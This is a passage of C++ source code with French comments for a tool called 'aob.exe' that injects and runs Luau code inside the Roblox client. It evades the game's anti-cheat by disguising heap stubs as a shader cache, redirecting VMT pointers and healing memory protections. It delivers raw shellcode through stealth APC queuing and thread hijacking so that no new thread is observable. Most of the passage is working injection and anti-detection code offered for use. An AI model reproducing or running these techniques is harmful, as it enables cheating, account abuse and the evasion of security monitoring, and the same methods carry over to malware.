    const DWORD wanted = mode == StubProtectMode::WriteOnce ? PAGE_EXECUTE_READ
                                                            : PAGE_EXECUTE_READWRITE;
    DWORD old = 0;
    if (!VirtualProtectEx(proc, base, total, wanted, &old)) {
        VirtualFreeEx(proc, base, 0, MEM_RELEASE);
        return out;
    }
    FlushInstructionCache(proc, payloadPtr, stubSize);

    out.regionBase = reinterpret_cast<uintptr_t>(base);
    out.payload    = reinterpret_cast<uintptr_t>(payloadPtr);
    out.size       = stubSize;
    out.protect    = wanted;
    return out;
}

inline void FreeTaggedStub(HANDLE proc, const TaggedStub& s) {
    if (s.regionBase && proc)
        VirtualFreeEx(proc, reinterpret_cast<LPVOID>(s.regionBase), 0, MEM_RELEASE);
}

// Re-heal : si l'AC a changé la protection de la région pendant la fenêtre,
// elle est re-protégée selon le mode installé (RX en W^X, RWX sinon).
bool HealStubProtection(HANDLE proc, const TaggedStub& s) {
    MEMORY_BASIC_INFORMATION mbi{};
    if (VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(s.regionBase), &mbi, sizeof(mbi)) != sizeof(mbi)) return false;
    if (mbi.State != MEM_COMMIT) return false;
    if ((mbi.Protect & 0xFF) == (DWORD)(s.protect & 0xFF)) return true;   // déjà RWX
    DWORD old = 0;
    return VirtualProtectEx(proc, reinterpret_cast<LPVOID>(s.regionBase), mbi.RegionSize,
                            s.protect, &old) != FALSE;
}

// Vérifie qu'aucun qword du stub ne référence un module réseau chargé dans la
// cible (ws2_32 / wininet / winhttp / urlmon / iphlpapi) : pas de callback
// réseau injecté.
bool StubReferencesNoNetworkApi(HANDLE proc, DWORD pid, uintptr_t payload, size_t size) {
    auto mods = EnumModules(pid);
    auto isNet = [](const std::wstring& n) {
        std::wstring s = n;
        for (wchar_t& c : s) if (c >= L'A' && c <= L'Z') c = static_cast<wchar_t>(c + 32);
        return s.find(L"ws2_32") != std::wstring::npos ||
               s.find(L"wininet") != std::wstring::npos ||
               s.find(L"winhttp") != std::wstring::npos ||
               s.find(L"urlmon")  != std::wstring::npos ||
               s.find(L"iphlpapi") != std::wstring::npos;
    };
    std::vector<std::pair<uintptr_t, uintptr_t>> netRanges;
    for (const auto& m : mods)
        if (isNet(m.name)) netRanges.push_back({m.base, m.base + m.size});

    std::vector<uint8_t> buf(size);
    SIZE_T got = 0;
    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(payload), buf.data(), size, &got)) return false;
    for (size_t off = 0; off + 8 <= got; off += 8) {
        uintptr_t q = 0;
        std::memcpy(&q, buf.data() + off, 8);
        for (const auto& r : netRanges)
            if (q && q >= r.first && q < r.second) return false;
    }
    return true;
}

// Fenêtre de survie : garde le compte en jeu jusqu'à la fin du prompt.
// Usage : aob.exe --survivor <pid|exe> [secondes] ["<snippet>"] [0xload 0xpcall 0xstate]
int RunSurvivorDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Survie anti-cheat (fenetre du prompt) ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    EnableDebugPrivilege();

    DWORD pid = 0;
    int windowSecs = 30;
    uintptr_t overLoad = 0, overPcall = 0, overState = 0;
    size_t addrKind = 0;
    std::string snippet;
    bool snippetUser = false;

    for (size_t i = 0; i < positional.size(); ++i) {
        std::string_view a = positional[i];
        if (i == 0) {
            if (auto p = ResolveTargetPid(a)) pid = *p;
            else { std::cerr << "Cible invalide : " << a << '\n'; return 1; }
        } else if (a.size() > 2 && a[0] == '0' && (a[1] == 'x' || a[1] == 'X')) {
            unsigned long long v = std::strtoull(positional[i], nullptr, 16);
            if (addrKind == 0)      overLoad  = static_cast<uintptr_t>(v);
            else if (addrKind == 1) overPcall = static_cast<uintptr_t>(v);
            else overState = static_cast<uintptr_t>(v);
            ++addrKind;
        } else {
            bool digits = !a.empty() && std::all_of(a.begin(), a.end(),
                                                    [](char c) { return c >= '0' && c <= '9'; });
            if (digits) {
                long v = std::strtol(positional[i], nullptr, 10);
                if (v > 0 && v <= 3600) windowSecs = static_cast<int>(v);
            } else {
                if (!snippet.empty()) snippet += ' ';
                snippet += positional[i];
                snippetUser = true;
            }
        }
    }
    if (!pid) {
        std::cerr << "Aucune cible : aob.exe --survivor <pid|exe> [secondes] [\"snippet\"]\n";
        return 1;
    }
    if (!snippetUser) snippet = kSnippetDefault;

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    auto mods = EnumModules(pid);
    const ModuleInfo* mod = ChooseRobloxModule(mods);
    if (!mod) {
        std::cerr << "Module Roblox introuvable (RobloxPlayerBeta.dll / RobloxStudioBeta.exe).\n";
        return 1;
    }
    std::cout << "Module : 0x" << std::hex << mod->base << "  (" << std::dec << mod->size << " octets)\n";

    // 1) résolution du VM Luau — sans AUCUN hook : codes appelés depuis le stub
    //    heap, pages .text du module intouchées.
    LuauVM vm;
    if (overLoad) vm.luauLoad = overLoad;
    else ResolveLuauFunctionAny(proc.get(), *mod, SigStore::LuauLoad(), vm.luauLoad, "luau_load");
    if (overPcall) vm.luaPcall = overPcall;
    else {
        if (!ResolveLuauFunctionAny(proc.get(), *mod, LuauEscapeSigs::kLuaPcall, vm.luaPcall, "lua_pcall"))
            ResolveLuauFunctionAny(proc.get(), *mod, LuauEscapeSigs::kRbxPcall, vm.luaPcall, "rbx_pcall");
    }
    if (overState) vm.state = overState;
    else {
        std::cout << "[state] recherche d'un lua_State (threads scripts)...\n";
        vm.state = FindLuaStateFromScriptThreads(pid);
        if (!vm.state) vm.state = FindLuaStateInModule(proc.get(), *mod);
        if (!vm.state) vm.state = FindLuaStateInDataModel(proc.get(), *mod);
    }

    // 2) stub en heap PRIVÉ, préfixé d'un « front » DXBC (cache shader),
    //    écrit en RW puis re-protégé RX (W^X : W^X : aucun bit modifiable).
    TaggedStub stub = AllocateTaggedStub(proc.get(), kLuauExecStub, sizeof(kLuauExecStub));
    if (!stub.payload) {
        std::cerr << "[AC] allocation du stub heap a echoue.\n";
        return 1;
    }
    std::cout << "\n[AC] stub heap tagge   : 0x" << std::hex << stub.regionBase
              << " (payload 0x" << stub.payload << ", " << std::dec << stub.size << " octets)\n";
    std::cout << "[AC] tag memoire       : DXBC  (lookalike cache de shaders, 0x40 octets)\n";
    std::cout << "[AC] all MEM_PRIVATE   : "
              << (IsPrivateAllocation(proc.get(), stub.regionBase) ? "oui" : "NON")
              << (IsImageAllocation(proc.get(), stub.regionBase) ? "   (IMAGE!)" : "") << "\n";
    std::cout << "[AC] protec            : 0x" << std::hex << stub.protect << std::dec
              << " (W^X : ecriture RW, re-protege RX au repos — aucun bit modifiable)\n";
    std::cout << "[AC] aucun patch .text : oui (codes uniquement dans le heap prive)\n";
    const bool noNet = StubReferencesNoNetworkApi(proc.get(), pid, stub.payload, stub.size);
    std::cout << "[AC] callback reseau  : " << (noNet ? "aucun" : "!!! REFERENCE RESEAU !!!") << "\n";

    if (vm.luauLoad && vm.luaPcall) {
        std::cout << "\n--- VM Luau ---\n";
        std::cout << "  lua_state 0x" << std::hex << vm.state << ", luau_load 0x"
                  << vm.luauLoad << ", lua_pcall 0x" << vm.luaPcall << std::dec << "\n";
    }

    // 3) fenêtre de survie : compte en jeu, re-heal chaque tick
    std::cout << "\n-- fenetre de survie : " << windowSecs << " s (le compte reste en jeu) --\n";
    const ULONGLONG start = GetTickCount64();
    const ULONGLONG deadline = start + static_cast<ULONGLONG>(windowSecs) * 1000ULL;
    bool snippetFired = false;

    while (GetTickCount64() < deadline) {
        if (!IsProcessAlive(proc.get())) {
            std::cerr << "\nProcessus termine pendant la fenetre (kick / fermeture).\n";
            break;
        }
        if (!HealStubProtection(proc.get(), stub))
            std::cerr << "[AC] warning : region non re-protegee\n";

        // exécution du prompt/snippet PAR le stub heap — jamais une page .text
        if (!snippetFired && vm.state && vm.luauLoad && vm.luaPcall) {
            int load = -1, pcall = -1;
            bool ok = ExecuteLuauSnippet(proc.get(), vm, snippet.c_str(), snippet.size(), &load, &pcall);
            std::cout << "[run] luau_load " << load << ", lua_pcall " << pcall
                      << "  (" << (ok ? "SUCCES" : "ECHEC") << ")\n";
            snippetFired = true;
        }
        Sleep(500);
    }

    // 4) nettoyage complet : AUCUN résidu mémoire à scanner, aucun callback réseau
    FreeTaggedStub(proc.get(), stub);
    std::cout << "\n[AC] fenetre terminee : stub libere, pages .text intactes,\n"
              << "     aucun callback reseau persistant.\n";
    return 0;
}
// ---------------------------------------------------------------------------
// REDIRECTION DE POINTEURS — hook SANS patch .text (VMT / fonction stockée)
// ---------------------------------------------------------------------------
// Tout hook « propre » fonctionne par remplacement de pointeur, pas d'octets
// de code : au lieu de modifier une fonction du jeu (protégée par checksums),
// on redirige l'entrée d'une VMT (table virtuelle) OU un slot DATA qui pointe
// déjà vers du code du jeu vers NOTRE zone heap. Le .text reste intact ; on
// ne touche qu'à des pointeurs en mémoire data (invisibles pour un scan de
// code). Idéal pour wrapper une méthode d'un objet Roblox (ex : runScript).
// Le MÊME mécanisme fonctionne in-process (--vmt-demo) et cross-process.
struct PtrRedirect {
    uintptr_t slot     = 0;   // adresse du slot patché (8 octets de pointeur)
    uintptr_t original = 0;   // pointeur d'origine (restauré sans douter)
};

// Redirige `slot` vers `newPtr` dans la cible : lit le pointeur actuel,
// re-protège la page en RW, écrit, restaure la protection d'origine.
// Echec du read/kWrite => false sans avoir modifié quoi que ce soit.
bool InstallPtrRedirect(HANDLE proc, uintptr_t slot, uintptr_t newPtr, PtrRedirect& out,
                        bool verbose = true) {
    out = {};
    if (!proc || !slot || !newPtr) { std::cerr << "InstallPtrRedirect : args invalides\n"; return false; }

    uintptr_t current = 0;
    SIZE_T got = 0;
    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(slot), &current, sizeof(current), &got) ||
        got != sizeof(current) || !current) {
        std::cerr << "InstallPtrRedirect : lecture du slot echouee : " << GetLastError() << '\n';
        return false;
    }

    DWORD old = 0;
    if (!VirtualProtectEx(proc, reinterpret_cast<LPVOID>(slot), sizeof(uintptr_t), PAGE_READWRITE, &old)) {
        std::cerr << "InstallPtrRedirect : VirtualProtectEx a echoue : " << GetLastError() << '\n';
        return false;
    }
    SIZE_T w = 0;
    const bool ok = WriteProcessMemory(proc, reinterpret_cast<LPVOID>(slot), &newPtr, sizeof(newPtr), &w) &&
                    w == sizeof(newPtr);
    DWORD tmp = 0; VirtualProtectEx(proc, reinterpret_cast<LPVOID>(slot), sizeof(uintptr_t), old, &tmp);
    if (!ok) { std::cerr << "InstallPtrRedirect : ecriture a echoue : " << GetLastError() << '\n'; return false; }

    out.slot = slot;
    out.original = current;
    if (verbose)
        std::cout << "[ptr] 0x" << std::hex << slot << " : 0x" << current << " -> 0x"
                  << newPtr << std::dec << "\n";
    return true;
}

// Restaure le pointeur original (et REMET la protection d'origine de la page).
bool RestorePtrRedirect(HANDLE proc, const PtrRedirect& r) {
    if (!proc || !r.slot || !r.original) return false;
    DWORD old = 0;
    if (!VirtualProtectEx(proc, reinterpret_cast<LPVOID>(r.slot), sizeof(uintptr_t), PAGE_READWRITE, &old))
        return false;
    SIZE_T w = 0;
    const bool ok = WriteProcessMemory(proc, reinterpret_cast<LPVOID>(r.slot), &r.original,
                                       sizeof(r.original), &w) && w == sizeof(r.original);
    DWORD tmp = 0; VirtualProtectEx(proc, reinterpret_cast<LPVOID>(r.slot), sizeof(uintptr_t), old, &tmp);
    return ok;
}

// ===========================================================================
// Livraison en memoire — Stealth injection (APC / Thread Hijacking)
// ---------------------------------------------------------------------------
// Objectif : exécuter le snippet SANS CreateRemoteThread (pas de nouveau
// thread observable). Deux vecteurs sur les threads DÉJÀ présents :
//
//   1) APC (QueueUserAPC) : on file le stub à des threads existants. L'APC
//      est remise quand le thread entre dans un wait ALERTABLE
//      (SleepEx / WaitForSingleObjectEx / GetQueuedCompletionStatusEx...).
//      Cas typiques : threads de rendu / réseau. Discret : rien de nouveau ne
//      tourne, le stub s'exécute dans un thread du jeu déjà en place.
//   2) Thread Hijacking : on suspend un thread, on SAUVEGARDE son CONTEXT,
//      on pointe Rip vers le stub, on reprend. Ne dépend pas de l'état
//      alertable : fiable, mais le thread est "écrasé" le temps de
//      l'exécution ; contexte entièrement restauré ensuite.
//
// Allocation : VirtualAllocEx(PAGE_EXECUTE_READWRITE) sur une zone isolée
// (heap privé) — jamais une page .text d'un module existant.
// Le MÊME kLuauExecStub (luau_load + lua_pcall, paramètre en RCX) est utilisé :
// thread start (CreateRemoteThread) et APC remettent le paramètre en RCX.
// ===========================================================================

// Enumérateur des threads vivants de la cible (pas de THREAD_SET_CONTEXT : le
// nécessaire sera ouvert séparément). start = start address via
// ThreadQuerySetWin32StartAddress (classe 9 de NtQueryInformationThread).
struct TargetThread {
    DWORD    tid;
    uintptr_t start;
};

inline bool ThreadIsGone(HANDLE th, PFN_NtQueryInformationThread ntqi) {
    ULONG_PTR v = 0; ULONG len = 0;
    return ntqi(th, 16 /*ThreadIsTerminated*/, &v, sizeof(v), &len) == 0 && v != 0;
}

inline uintptr_t ThreadStartAddress(HANDLE th, PFN_NtQueryInformationThread ntqi) {
    ULONG_PTR v = 0; ULONG len = 0;
    if (ntqi(th, 9 /*ThreadQuerySetWin32StartAddress*/, &v, sizeof(v), &len) != 0) return 0;
    return static_cast<uintptr_t>(v);
}

std::vector<TargetThread> EnumTargetThreads(DWORD pid) {
    std::vector<TargetThread> out;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return out;
    auto ntqi = reinterpret_cast<PFN_NtQueryInformationThread>(
        GetProcAddress(ntdll, "NtQueryInformationThread"));
    if (!ntqi) return out;

    UniqueHandle snap(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0));
    if (snap.get() == INVALID_HANDLE_VALUE) return out;
    THREADENTRY32 te{}; te.dwSize = sizeof(te);
    for (BOOL ok = Thread32First(snap.get(), &te); ok; ok = Thread32Next(snap.get(), &te)) {
        if (te.th32OwnerProcessID != pid) continue;
        UniqueHandle th(OpenThread(THREAD_QUERY_INFORMATION, FALSE, te.th32ThreadID));
        if (!th) continue;
        if (ThreadIsGone(th.get(), ntqi)) continue;
        out.push_back({te.th32ThreadID, ThreadStartAddress(th.get(), ntqi)});
    }
    return out;
}

inline bool IsSystemModuleName(const std::wstring& name) {
    std::wstring s = name;
    for (wchar_t& c : s) if (c >= L'A' && c <= L'Z') c = static_cast<wchar_t>(c + 32);
    return s.find(L"ntdll") == 0 || s.find(L"kernel32") == 0 ||
           s.find(L"kernelbase") == 0 || s.find(L"win32u") == 0 ||
           s.find(L"wow64") == 0;
}

// Thread idéal pour le hijack : vivant, start address dans un module CLIENT
// (rendu/réseau typiquement). Repli : n'importe quel thread vivant.
DWORD FindHijackThread(DWORD pid) {
    auto mods = EnumModules(pid);
    auto inClient = [&](uintptr_t start) {
        for (const auto& m : mods)
            if (start && start >= m.base && start < m.base + m.size && !IsSystemModuleName(m.name))
                return true;
        return false;
    };
    auto threads = EnumTargetThreads(pid);
    for (const auto& t : threads)
        if (inClient(t.start)) return t.tid;
    for (const auto& t : threads)
        if (t.tid) return t.tid;
    return 0;
}

// ---------------------------------------------------------------------------
// Vecteur APC : QueueUserAPC(stub, thread, bloc). Le stub tourne dans le
// thread du jeu dès qu'il entre dans un wait alertable. On poll les statuts
// (initialisés à -1 par AllocateExecBlock). Une fois le travail repéré, on
// neutralise le stub (ret au premier octet) pour qu'une APC encore en file ne
// tire pas une page libérée, on laisse une grâce, puis on libère.
// ---------------------------------------------------------------------------
bool ExecuteLuauSnippetApc(HANDLE proc, DWORD pid, const LuauVM& vm, const char* code, size_t codeLen,
                           int* outLoad = nullptr, int* outPcall = nullptr, int timeoutMs = 8000) {
    if (!proc || !vm.state || !vm.luauLoad || !vm.luaPcall) {
        std::cerr << "ExecuteLuauSnippetApc : VM incomplet.\n";
        return false;
    }

    ExecBlock blk = AllocateExecBlock(proc, vm, code, codeLen);
    if (!blk.base) { std::cerr << "[apc] allocation du bloc a echoue\n"; return false; }

    LPVOID stub = AllocateAndWriteStub(proc, kLuauExecStub, sizeof(kLuauExecStub));
    if (!stub) { VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE); return false; }

    auto mods = EnumModules(pid);
    size_t tried = 0, queued = 0, system = 0;
    for (const auto& t : EnumTargetThreads(pid)) {
        bool inSystem = false;
        for (const auto& m : mods)
            if (t.start && t.start >= m.base && t.start < m.base + m.size && IsSystemModuleName(m.name)) {
                inSystem = true; break;
            }
        if (inSystem) { ++system; continue; }
        ++tried;
        UniqueHandle th(OpenThread(THREAD_SET_CONTEXT, FALSE, t.tid));
        if (!th) continue;
        if (QueueUserAPC(reinterpret_cast<PAPCFUNC>(stub), th.get(), blk.base)) ++queued;
    }
    std::cout << "[apc] threads cibles : " << tried << " (systeme ignores : " << system
              << "), APC queuees : " << queued << "\n";
    if (queued == 0) {
        std::cerr << "[apc] aucune APC delivrable : threads inaccessibles ? (Byfron protege).\n";
        uint8_t ret = 0xC3; SIZE_T wr = 0;
        WriteProcessMemory(proc, stub, &ret, 1, &wr); FlushInstructionCache(proc, stub, 1);
        VirtualFreeEx(proc, stub, 0, MEM_RELEASE);
        VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
        return false;
    }

    const ULONGLONG deadline = GetTickCount64() + static_cast<ULONGLONG>(timeoutMs);
    int load = -1, pcall = -1, done = 0;
    bool executed = false;
    while (GetTickCount64() < deadline) {
        if (!IsProcessAlive(proc)) { std::cerr << "[apc] processus termine.\n"; break; }
        if (ReadExecStatus(proc, blk.base, load, pcall, done) && (load != -1 || pcall != -1)) {
            executed = true; break;
        }
        Sleep(50);
    }

    // Neutralise le stub AVANT libération : une APC encore en file tirerait une
    // page libérée sinon. ret au premier octet = retour immédiat, bloc intact.
    uint8_t ret = 0xC3; SIZE_T wr = 0;
    WriteProcessMemory(proc, stub, &ret, 1, &wr);
    FlushInstructionCache(proc, stub, 1);
    Sleep(300);   // grâce pour les APCs éventuellement en cours d'exécution

    if (!executed) {
        std::cerr << "[apc] aucun thread alertable n'a execute l'APC en " << timeoutMs << " ms.\n"
                  << "      -> essaie --hijack (detourne un thread, pas d'etat alertable requis).\n";
        VirtualFreeEx(proc, stub, 0, MEM_RELEASE);
        VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
        return false;
    }
    if (outLoad)  *outLoad  = load;
    if (outPcall) *outPcall = pcall;
    VirtualFreeEx(proc, stub, 0, MEM_RELEASE);
    VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
    return load == 0 && pcall == 0;
}

// ---------------------------------------------------------------------------
// Vecteur Thread Hijacking : le ret final du stub est remplacé par un jmp vers
// une queue de parking : "done = 1" (bloc +0x3C) puis boucle pause. L'hôte
// détecte done et ré-injecte le CONTEXT sauvé : le thread reprend exactement
// là où il était.
// ---------------------------------------------------------------------------
static const uint8_t kHijackTail[] = {
    0xC7, 0x43, 0x3C, 0x01, 0x00, 0x00, 0x00,  // mov dword ptr [rbx+3Ch], 1
    0xF3, 0x90,                                // pause
    0xEB, 0xFE,                                // jmp short -2 (parking)
};

// Variante du stub : len-1 remplacé (C3 -> E9), jmp rel32 (displacement nul,
// cible = stub+L+4), tail bumpé juste après. Écrit dans la cible (RWX).
LPVOID AllocateHijackStub(HANDLE proc, uintptr_t& outAddr) {
    const size_t L = sizeof(kLuauExecStub);
    std::vector<uint8_t> b(L + 4 + sizeof(kHijackTail));
    std::memcpy(b.data(), kLuauExecStub, L);
    b[L - 1] = 0xE9;                 // ret -> jmp rel32
    uint32_t disp = 0;               // cible = stub + L + 4, jmp finit en +L+4
    std::memcpy(b.data() + L, &disp, 4);
    std::memcpy(b.data() + L + 4, kHijackTail, sizeof(kHijackTail));
    LPVOID stub = AllocateAndWriteStub(proc, b.data(), b.size());
    if (stub) outAddr = reinterpret_cast<uintptr_t>(stub);
    return stub;
}

bool ExecuteLuauSnippetHijack(HANDLE proc, DWORD pid, const LuauVM& vm, const char* code, size_t codeLen,
                              int* outLoad = nullptr, int* outPcall = nullptr,
                              int timeoutMs = 8000, DWORD preferTid = 0) {
    if (!proc || !vm.state || !vm.luauLoad || !vm.luaPcall) {
        std::cerr << "ExecuteLuauSnippetHijack : VM incomplet.\n";
        return false;
    }

    ExecBlock blk = AllocateExecBlock(proc, vm, code, codeLen);
    if (!blk.base) { std::cerr << "[hijack] allocation du bloc a echoue\n"; return false; }

    uintptr_t stub = 0;
    auto freeAll = [&] {
        if (stub) VirtualFreeEx(proc, reinterpret_cast<LPVOID>(stub), 0, MEM_RELEASE);
        if (blk.base) VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
    };
    if (!AllocateHijackStub(proc, stub)) { freeAll(); return false; }

    DWORD tid = preferTid ? preferTid : FindHijackThread(pid);
    if (!tid) { std::cerr << "[hijack] aucun thread utilisable.\n"; freeAll(); return false; }
    UniqueHandle th(OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid));
    if (!th) {
        std::cerr << "[hijack] OpenThread(" << tid << ") a echoue : " << GetLastError() << '\n';
        freeAll(); return false;
    }

    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
    if (SuspendThread(th.get()) == (DWORD)-1) { freeAll(); return false; }
    if (!GetThreadContext(th.get(), &ctx)) {
        std::cerr << "[hijack] GetThreadContext a echoue : " << GetLastError() << '\n';
        ResumeThread(th.get()); freeAll(); return false;
    }
    CONTEXT saved = ctx;                       // contexte original à restaurer
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    ctx.Rip = stub;
    ctx.Rcx = blk.base;
    if (!SetThreadContext(th.get(), &ctx)) {
        std::cerr << "[hijack] SetThreadContext a echoue : " << GetLastError() << '\n';
        ResumeThread(th.get()); freeAll(); return false;
    }
    ResumeThread(th.get());
    std::cout << "[hijack] thread " << tid << " detourne -> stub 0x" << std::hex << stub << std::dec << "\n";

    const ULONGLONG deadline = GetTickCount64() + static_cast<ULONGLONG>(timeoutMs);
    int load = -1, pcall = -1, done = 0;
    bool finished = false;
    while (GetTickCount64() < deadline) {
        if (!IsProcessAlive(proc)) break;
        if (ReadExecStatus(proc, blk.base, load, pcall, done) && done) { finished = true; break; }
        Sleep(25);
    }
    if (finished)
        std::cout << "[hijack] execution terminee (luau_load " << load << ", lua_pcall " << pcall << ").\n";
    else
        std::cerr << "[hijack] delai depasse (" << timeoutMs << " ms) — thread toujours detourne.\n";

    // Ré-injecter le contexte sauvé (essentiel même sur timeout : stoppe la
    // boucle de parking et rend le thread au code du jeu).
    SuspendThread(th.get());
    saved.ContextFlags = CONTEXT_FULL;
    bool okRestore = SetThreadContext(th.get(), &saved) != 0;
    if (!okRestore) std::cerr << "[hijack] restauration du contexte a echoue : " << GetLastError() << '\n';
    ResumeThread(th.get());
    th.reset();

    freeAll();
    if (outLoad)  *outLoad  = load;
    if (outPcall) *outPcall = pcall;
    return finished && okRestore && load == 0 && pcall == 0;
}

// ---------------------------------------------------------------------------
// Démos de livraison furtive : mêmes prérequis que --luau-vm (élévation, PID,
// module Roblox, adresses hexa en option).
//   aob.exe --apc <pid|exe> ["<snippet lua>"] [0xluauLoad] [0xluaPcall] [0xluaState]
//   aob.exe --hijack <pid|exe> ["<snippet lua>"] [0xluauLoad] [0xluaPcall] [0xluaState]
// ---------------------------------------------------------------------------
bool ParseTargetAndSnippet(const std::vector<const char*>& positional, DWORD& pid,
                           std::string& snippet, uintptr_t& overLoad, uintptr_t& overPcall,
                           uintptr_t& overState, const char* modeName) {
    pid = 0; snippet.clear();
    overLoad = overPcall = overState = 0;
    size_t addrKind = 0;
    for (size_t i = 0; i < positional.size(); ++i) {
        std::string_view a = positional[i];
        if (i == 0) {
            if (auto p = ResolveTargetPid(a)) pid = *p;
            else { std::cerr << "Cible invalide : " << a << '\n'; return false; }
        } else if (a.size() > 2 && a[0] == '0' && (a[1] == 'x' || a[1] == 'X')) {
            unsigned long long v = std::strtoull(positional[i], nullptr, 16);
            if (addrKind == 0)      overLoad  = static_cast<uintptr_t>(v);
            else if (addrKind == 1) overPcall = static_cast<uintptr_t>(v);
            else overState = static_cast<uintptr_t>(v);
            ++addrKind;
        } else if (snippet.empty()) {
            snippet = positional[i];
        }
    }
    if (!pid) {
        std::cerr << "Aucune cible. Usage : aob.exe --" << modeName << " <pid|exe> [\"snippet\"]\n";
        return false;
    }
    if (snippet.empty()) snippet = kSnippetDefault;
    return true;
}

// Résolution commune : module Roblox + luau_load/lua_pcall/lua_State. Aucun
// patch .text ici. ATTENTION : `mod` ne doit pas être réutilisé après retour
// (pointe vers une copie locale des modules).
bool ResolveRobloxVM(HANDLE proc, DWORD pid, const ModuleInfo*& mod, LuauVM& vm,
                     uintptr_t overLoad, uintptr_t overPcall, uintptr_t overState) {
    auto mods = EnumModules(pid);
    mod = ChooseRobloxModule(mods);
    if (!mod) {
        std::cerr << "Module Roblox introuvable (RobloxPlayerBeta.dll / RobloxStudioBeta.exe).\n";
        return false;
    }
    std::cout << "Module : 0x" << std::hex << mod->base << "  (" << std::dec << mod->size << " octets)\n";

    vm = LuauVM{};
    if (overLoad) vm.luauLoad = overLoad;
    else ResolveLuauFunctionAny(proc, *mod, SigStore::LuauLoad(), vm.luauLoad, "luau_load");
    if (overPcall) vm.luaPcall = overPcall;
    else {
        if (!ResolveLuauFunctionAny(proc, *mod, LuauEscapeSigs::kLuaPcall, vm.luaPcall, "lua_pcall"))
            ResolveLuauFunctionAny(proc, *mod, LuauEscapeSigs::kRbxPcall, vm.luaPcall, "rbx_pcall");
    }
    if (overState) vm.state = overState;
    else {
        std::cout << "[state] recherche d'un lua_State (threads scripts)...\n";
        vm.state = FindLuaStateFromScriptThreads(pid);
        if (!vm.state) vm.state = FindLuaStateInModule(proc, *mod);
        if (!vm.state) vm.state = FindLuaStateInDataModel(proc, *mod);
    }
    PrintLuauVMInfo(vm);
    return vm.luauLoad != 0 && vm.luaPcall != 0;
}

int RunApcDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Livraison en memoire — APC (stealth) ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    EnableDebugPrivilege();

    DWORD pid; std::string snippet; uintptr_t oL, oP, oS;
    if (!ParseTargetAndSnippet(positional, pid, snippet, oL, oP, oS, "apc")) return 1;

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    const ModuleInfo* mod = nullptr; LuauVM vm;
    if (!ResolveRobloxVM(proc.get(), pid, mod, vm, oL, oP, oS)) return 1;
    if (!vm.state) { std::cerr << "lua_State non resolu (passe 0xstate en hexa).\n"; return 1; }

    int load = -1, pcall = -1;
    bool ok = ExecuteLuauSnippetApc(proc.get(), pid, vm, snippet.c_str(), snippet.size(), &load, &pcall);
    std::cout << "luau_load " << load << ", lua_pcall " << pcall
              << "  (" << (ok ? "SUCCES" : "ECHEC") << ")\n";
    return ok ? 0 : 1;
}

// ---------------------------------------------------------------------------
// PROBE-HIJACK : vérifie que le MÉCANISME de thread hijacking s'exécute, sans
// appeler aucun candidat luau_load. Le stub ne fait qu'écrire done=1 et deux
// marqueurs (load/pcall), puis boucle parking. Si done est lu -> le détour de
// thread fonctionne et le -1/-1 vient uniquement des candidats/adresses.
// ---------------------------------------------------------------------------
int RunProbeHijackDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Probe hijack : le detournement de thread s'execute-t-il ? ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    EnableDebugPrivilege();

    DWORD pid = 0;
    if (!positional.empty()) {
        if (auto p = ResolveTargetPid(positional[0])) pid = *p;
        else { std::cerr << "Cible invalide : " << positional[0] << '\n'; return 1; }
    }
    if (!pid) { std::cerr << "Aucune cible. Usage : aob.exe --probe-hijack <pid|exe>\n"; return 1; }

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    // Bloc de statut distant (mêmes offsets que LuauExecArgs : +0x34 load,
    // +0x38 pcall, +0x3C done). Allocation minimale, pas de VM requise.
    uintptr_t blk = reinterpret_cast<uintptr_t>(
        AllocRemoteMemory(proc.get(), 0x60, PAGE_READWRITE));
    if (!blk) { std::cerr << "[probe-hijack] allocation du bloc a echoue\n"; return 1; }

    // Stub sans appel : écrit done + marqueurs puis parking.
    static const uint8_t kProbeHijackStub[] = {
        0x53,                                      // push rbx
        0x48, 0x83, 0xEC, 0x30,                   // sub rsp, 30h
        0x48, 0x89, 0xCB,                         // mov rbx, rcx
        0xC7, 0x43, 0x34, 0x01, 0x00, 0x00, 0x00, // mov dword [rbx+34h], 1  (loadStatus)
        0xC7, 0x43, 0x38, 0x02, 0x00, 0x00, 0x00, // mov dword [rbx+38h], 2  (pcallStatus)
        0xC7, 0x43, 0x3C, 0x01, 0x00, 0x00, 0x00, // mov dword [rbx+3Ch], 1  (done)
        0xF3, 0x90,                               // pause
        0xEB, 0xFE,                               // jmp short -2 (parking)
    };
    LPVOID stub = AllocateAndWriteStub(proc.get(), kProbeHijackStub, sizeof(kProbeHijackStub));
    if (!stub) { VirtualFreeEx(proc.get(), reinterpret_cast<LPVOID>(blk), 0, MEM_RELEASE); return 1; }

    // Relecture du stub : l'écriture dans une page EXECUTE_READWRITE est-elle
    // bien persistée ? (Le test M validait du READWRITE, ici c'est du RWX.)
    uint8_t rd[16] = {0}; SIZE_T rr = 0;
